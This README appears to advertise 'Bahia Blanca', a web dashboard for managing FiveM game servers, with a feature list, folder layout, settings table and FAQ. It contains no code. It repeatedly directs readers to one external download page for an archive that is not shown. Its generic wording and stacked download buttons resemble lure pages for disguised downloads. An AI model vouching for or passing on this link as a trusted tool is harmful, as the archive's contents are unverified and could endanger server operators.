# Bahia Blanca v1.0 — FiveM Web Administration Dashboard 2026

> **A browser-based control panel for FiveM roleplay server management.** Offers server administrators a convenient dashboard to handle resources, player information, and server configuration directly from any web browser.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adamsoliver51/bahia-blanca-hub-update?style=flat-square)](https://github.com/adamsoliver51/bahia-blanca-hub-update)

---

<p align="center">
  <a href="https://adamsoliver51.github.io/bahia-blanca-hub-update/">
    <img src="https://img.shields.io/badge/Download-Bahia%20Blanca%20Script-brightgreen?style=for-the-badge" alt="Download Bahia Blanca Script">
  </a>
</p>

> **[Direct Download - Bahia Blanca](https://adamsoliver51.github.io/bahia-blanca-hub-update/)**

---

[Download Latest Build](https://adamsoliver51.github.io/bahia-blanca-hub-update/)

---

## About

Bahia Blanca delivers a lightweight, web-first interface tailored for FiveM server operators who want to monitor and manage their game environment without needing to launch the full client. Constructed with HTML and standard web technologies, this tool links to your server's backend to surface essential metrics, handle connected players, and adjust configuration parameters in real time. The current release focuses on a clean, responsive dashboard that functions across contemporary browsers.

This utility simplifies routine admin tasks by concentrating common server controls into one web page. Whether you need to review resource consumption, broadcast server-wide messages, or tweak gameplay settings, Bahia Blanca provides a practical substitute for command-line or in-game management. The 2026 version refines the interface layout and boosts data refresh performance for larger player populations.

---

## Key Capabilities

- Web-based dashboard for real-time FiveM server status and player activity monitoring
- Resource management panel enabling remote start, stop, or restart of server scripts
- Player list displaying connection details, identifiers, and moderation options
- Live server console output viewable directly within the web interface
- Configuration editor for server settings modifications without file access
- Responsive layout compatible with both desktop and mobile browsers
- Lightweight HTML implementation requiring zero extra dependencies
- Secure session handling restricting access to authorized administrators

---

## Installation

Download the most recent build from the link above and unpack the archive into your FiveM server's web root directory. Confirm that your server has a web server module enabled (for example, `webadmin`) and that the script files reside in the correct public folder. No compilation is necessary because the script runs directly in the browser.

Expected folder layout after placement:

```
server-data/
└── resources/
    └── [web]/
        └── bahia-blanca/
            ├── index.html
            ├── style.css
            └── script.js
```

---

## Configuration

The following parameters can be modified within the main HTML file or via the in-browser settings panel:

| Setting | Default | Description |
|---------|---------|-------------|
| `refreshInterval` | 5000 | Data refresh frequency in milliseconds |
| `maxPlayersDisplay` | 64 | Maximum player entries shown in the list |
| `enableConsole` | true | Toggle server console output display |
| `theme` | dark | Interface color scheme (dark/light) |

---

## Compatibility

This web interface is built for FiveM servers operating on Windows or Linux hosts with an active web server component. It has been tested with FiveM builds from 2024 onward and works with most modern browsers, including Chrome, Firefox, and Edge. Limited functionality may occur on older browser versions or when the server web module is not correctly configured.

---

## Frequently Asked Questions

**How do I install the script on my server?**  
Place the downloaded files into your FiveM server's web resources folder and ensure the resource is started in your server configuration.

**Will updates break my existing setup?**  
Updates are designed to be backward-compatible. Always back up your current configuration files before applying a new version.

**Can I customize the dashboard appearance?**  
Yes, the CSS stylesheet is fully editable. You can modify colors, fonts, and layout to match your community branding.

**Does this work with any FiveM server build?**  
It works with standard FiveM builds that include the webadmin module. Custom server builds may require adjustments.

**Where are player logs and server data stored?**  
All data is pulled directly from the running FiveM server process. No separate storage or database is required for basic functionality.

---

## License

GNU GPL v3.0 — see [LICENSE](LICENSE) for details.
